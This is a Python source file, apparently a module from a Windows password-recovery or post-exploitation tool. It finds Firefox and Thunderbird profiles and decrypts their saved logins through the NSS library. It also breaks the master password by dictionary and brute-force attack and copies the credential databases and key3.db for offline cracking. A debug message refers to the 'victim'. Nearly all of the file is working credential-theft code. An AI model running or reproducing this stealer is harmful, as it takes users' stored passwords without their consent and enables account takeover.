#!/usr/bin/env python
# Required files (key3.db, signongs.sqlite, cert8.db)
# Inspired from https://github.com/Unode/firefox_decrypt/blob/master/firefox_decrypt.py

from ctypes import *
import sys, os, re, glob
from base64 import b64decode
from ConfigParser import RawConfigParser
import sqlite3
import json
import shutil
from dico import get_dico
import itertools
from config.header import Header
from config.constant import *
from config.write_output import print_debug, print_output

# Password structures
class SECItem(Structure):
	_fields_ = [('type', c_uint),('data', c_void_p),('len', c_uint)]

# Database classes
database_find = False
class Credentials(object):
	def __init__(self, db):
		global database_find
		self.db = db
		if os.path.isfile(db):
			database_find = True
	
	def __iter__(self):
		pass
	def done(self):
		pass

class JsonDatabase(Credentials):
	def __init__(self, profile):
		db = profile + os.sep + "logins.json"
		super(JsonDatabase, self).__init__(db)
	
	def __iter__(self):
		with open(self.db) as fh:
			data = json.load(fh)
			try:
				logins = data["logins"]
			except:
				raise Exception("Unrecognized format in {0}".format(self.db))
			
			for i in logins:
				yield (i["hostname"], i["encryptedUsername"],	i["encryptedPassword"])

class SqliteDatabase(Credentials):
	def __init__(self, profile):
		db = profile + os.sep + "signons.sqlite"
		super(SqliteDatabase, self).__init__(db)
		self.conn = sqlite3.connect(db)
		self.c = self.conn.cursor()
	
	def __iter__(self):
		self.c.execute("SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins")
		for i in self.c:
			yield i
	
	def done(self):
		super(SqliteDatabase, self).done()
		self.c.close()
		self.conn.close()


class Mozilla():
	# b = brute force attack
	# m = manually
	# d = default list
	# a = dictionnary attack

	def __init__(self):
		
		self.credentials_categorie = None
		self.dll_NotFound = False
		
		firefox = ''
		if os.path.exists(os.environ['ProgramFiles'] + '\Mozilla Firefox'):
			firefox = os.environ['ProgramFiles'] + '\Mozilla Firefox'
		elif os.path.exists(os.environ['ProgramFiles(x86)'] + '\Mozilla Firefox'):
			firefox = os.environ['ProgramFiles(x86)'] + '\Mozilla Firefox'
		
		if os.path.exists(os.path.join(firefox, 'nss3.dll')):
			os.environ['PATH'] = ';'.join([firefox, os.environ['PATH']])
			self.libnss  = CDLL(os.path.join(firefox, 'nss3.dll'))
		else:
			self.dll_NotFound = True
		
		self.slot = None
		
		self.username = SECItem()
		self.passwd = SECItem()
		self.dectext = SECItem()
		
		self.toCheck = []
		self.manually_pass = None
		self.dictionnary_path = None
		self.number_toStop = None

	def __del__(self):
		if self.dll_NotFound == False:
			self.libnss.NSS_Shutdown()
		self.libnss = None
		
		self.username = None
		self.passwd = None
		self.dectext = None
	
	def get_path(self, software_name):
		if 'APPDATA' in os.environ:
			if software_name == 'Firefox':
				path =  '%s\Mozilla\Firefox' % str(os.environ['APPDATA'])
			elif software_name == 'Thunderbird':
				path = '%s%s\Thunderbird' % (os.environ['APPDATA'], os.environ.get('HOMEPATH' ))
		else:
			print_debug('The APPDATA environment variable is not definded.\nUse the -s option and specify the folder path of the victim\nPath: <HOMEPATH>\Application Data\Mozilla\Firefox\Profiles\<PROFILE_NAME>')
			return
		
		return path
	
	def manage_advanced_options(self):
		if constant.manually:
			self.manually_pass = constant.manually
			self.toCheck.append('m')
		
		if constant.path:
			self.dictionnary_path = constant.path
			self.toCheck.append('a')
		
		if constant.bruteforce:
			self.number_toStop = constant.bruteforce
			self.toCheck.append('b')
		
		if constant.defaultpass:
			self.toCheck.append('d')
		
		# default attack
		if self.toCheck == []:
			self.toCheck = ['b', 'd']
			self.number_toStop = 3

	def initialize_libnss(self, profile):
		if self.libnss.NSS_Init(profile)!=0:
			print_debug('ERROR', 'Could not initialize the NSS library\n')
			return False
		return True

	def decrypt(self, software_name, credentials):
		pwdFound = []
		for host, user, passw in credentials:
			values = {}
			values["Website"] = format(host.encode("utf-8"))
			self.username.data = cast(c_char_p(b64decode(user)), c_void_p)
			self.username.len = len(b64decode(user))
			self.passwd.data = cast(c_char_p(b64decode(passw)), c_void_p)
			self.passwd.len = len(b64decode(passw))
			
			if self.libnss.PK11SDR_Decrypt(byref(self.username), byref(self.dectext), None) != -1:
				values["Username"] = string_at(self.dectext.data, self.dectext.len)
			
			if self.libnss.PK11SDR_Decrypt(byref(self.passwd), byref(self.dectext), None) != -1:
				values["Password"] =  string_at(self.dectext.data, self.dectext.len)
		
			if len(values):
				pwdFound.append(values)
		return pwdFound
	
	# Get the path list of the firefox profiles
	def get_firefox_profiles(self, directory):
		cp = RawConfigParser()
		cp.read(os.path.join(directory, 'profiles.ini'))
		profile_list = []
		for section in cp.sections():
			if section.startswith('Profile'):
				if cp.has_option(section, 'Path'):
					profile_list.append(os.path.join(directory, cp.get(section, 'Path').strip()))
		return profile_list
	
	def save_db(self, userpath):
		# create the folder to save it by profile
		relative_path = constant.folder_name + os.sep + 'firefox'
		if not os.path.exists(relative_path):
			os.makedirs(relative_path)
		
		relative_path += os.sep + os.path.basename(userpath)
		if not os.path.exists(relative_path):
			os.makedirs(relative_path)
		
		# Get the database name
		if os.path.exists(userpath + os.sep + 'logins.json'):
			dbname = 'logins.json'
		elif os.path.exists(userpath + os.sep + 'signons.sqlite'):
			dbname = 'signons.sqlite'
		
		# copy the files (database + key3.db)
		try:
			ori_db = userpath + os.sep + dbname
			dst_db = relative_path + os.sep + dbname
			shutil.copyfile(ori_db, dst_db)
			print_debug('INFO', '%s has been copied here: %s' % (dbname, dst_db))
		except:
			print_debug('ERROR', '%s has not been copied' % dbname)
		
		try:
			dbname = 'key3.db'
			ori_db = userpath + os.sep + dbname
			dst_db = relative_path + os.sep + dbname
			shutil.copyfile(ori_db, dst_db)
			print_debug('INFO', '%s has been copied here: %s' % (dbname, dst_db))
		except:
			print_debug('ERROR', '%s has not been copied' % dbname)

	# ------------------------------ Master Password Functions ------------------------------
	
	# check if a masterpassword is set
	def is_masterpasswd_set(self):
		password = ''
		self.slot = self.libnss.PK11_GetInternalKeySlot()
		self.libnss.PK11_Authenticate(self.slot, True, 0)
		pw_good = self.libnss.PK11_CheckUserPassword(self.slot, c_char_p(password))
		self.libnss.PK11_FreeSlot(self.slot)
		
		# Not masterpassword set
		if pw_good == 0:
			return False
		else:
			return True
	
	def is_masterpassword_correct(self, pwd):
		pw_good = self.libnss.PK11_CheckUserPassword(self.slot, c_char_p(pwd))
		if pw_good == 0:
			return True
		return False
	
	# Retrieve masterpassword
	def found_masterpassword(self):
		
		# master password entered manually
		if 'm' in self.toCheck:
			print_debug('ATTACK', 'Check the password entered manually !')
			if self.is_masterpassword_correct(self.manually_pass):
				print_debug('FIND', 'Master password found: %s\n' % self.manually_pass)
				return True
			else:
				print_debug('WARNING', 'The Master password entered is not correct')
		
		# dictionnary attack
		if 'a' in self.toCheck:
			try:
				pass_file = open(self.dictionnary_path, 'r')
				num_lines = sum(1 for line in pass_file)
			except:
				print_debug('ERROR', 'Unable to open passwords file: %s' % str(self.dictionnary_path))
				return 1
			pass_file.close()
			
			print_debug('ATTACK', 'Dictionnary Attack !!! (%s words)' % str(num_lines))
			try:
				with open(self.dictionnary_path) as f:
					for p in f:
						if self.is_masterpassword_correct(p.strip()):
							print_debug('FIND', 'Master password found: %s\n' % p.strip())
							return True
			
			except (KeyboardInterrupt, SystemExit):
				print 'INTERRUPTED!'
				print_debug('DEBUG', 'Dictionnary attack interrupted')
			except:
				pass
			print_debug('WARNING', 'The Master password has not been found using the dictionnary attack')
		
		# 500 most used passwords
		if 'd' in self.toCheck:
			num_lines = (len(get_dico())-1)
			print_debug('ATTACK', '%d most used passwords !!! ' % num_lines)

			for word in get_dico():
				if self.is_masterpassword_correct(word):
					print_debug('FIND', 'Master password found: %s\n' % word.strip())
					return True
				
			print_debug('WARNING', 'No password has been found using the default list')
		
		# brute force attack
		if 'b' in self.toCheck:
			charset_list = 'abcdefghijklmnopqrstuvwxyz1234567890!?'
			tab = [i for i in charset_list]
			
			print_debug('ATTACK', 'Brute force attack !!! (%s characters)' %  str(self.number_toStop))
			current = 0
			pass_found = False
			try:
				while current <= self.number_toStop and pass_found == False:
					for i in itertools.product(tab, repeat=current):
						word = ''.join(map(str,i))
						if self.is_masterpassword_correct(word):
							print_debug('FIND', 'Master password found: %s\n' % word.strip())
							return True
					current+= 1
			except (KeyboardInterrupt, SystemExit):
				print 'INTERRUPTED!'
				print_debug('INFO', 'Dictionnary attack interrupted')
			except:
				pass
			print_debug('WARNING', 'No password has been found using the brute force attack')
		
	# ------------------------------ End of Master Password Functions ------------------------------
	
	# main function
	def retrieve_password(self):
		self.manage_advanced_options()
		
		software_name = constant.mozilla_software
		specific_path = constant.specific_path
		
		# get the installation path
		path = self.get_path(software_name)
		if not path:
			print_debug('ERROR', 'Installation path not found')
			return
		
		# print the title
		Header().title_debug(software_name)
		
		# Check if the libnss could be initialized well
		if self.dll_NotFound:
			print_debug('ERROR', 'The libnss have not been initialized because the nss3.dll has not been found')
		
		#Check if mozilla folder has been found
		elif not os.path.exists(path):
			print_debug('INFO', software_name + ' not installed.')
		
		else:
			if specific_path:
				if os.path.exists(specific_path):
					profile_list = [specific_path]
				else:
					print_debug('ERROR', 'The following file does not exist: %s' % specific_path)
					return
			else:
				profile_list = self.get_firefox_profiles(path)

			pwdFound = []
			for profile in profile_list:
				print_debug('INFO', 'Profile path found: %s' % profile)
				
				if self.initialize_libnss(profile):
					masterPwd = self.is_masterpasswd_set()
					if masterPwd:
						print_debug('WARNING', 'A masterpassword is used !!')
						masterPwdFound = self.found_masterpassword()
					
					if not masterPwd or masterPwdFound:
						# check if passwors are stored on the Json format
						credentials = JsonDatabase(profile)
						if not database_find:
							# check if passwors are stored on the sqlite format
							credentials = SqliteDatabase(profile)
						
						if not database_find:
							print_debug('ERROR', 'Couldn\'t find credentials file (logins.json or signons.sqlite)')
						
						try:
							# decrypt passwords on the db
							pwdFound+=self.decrypt(software_name, credentials)
						except:
							pass

					# if a master password is set (but not found), we save the db to bruteforce offline
					elif masterPwd and not masterPwdFound and constant.output == 'txt':
						self.save_db(profile)
						
					self.libnss.NSS_Shutdown()
			
			# print the results
			print_output(software_name, pwdFound)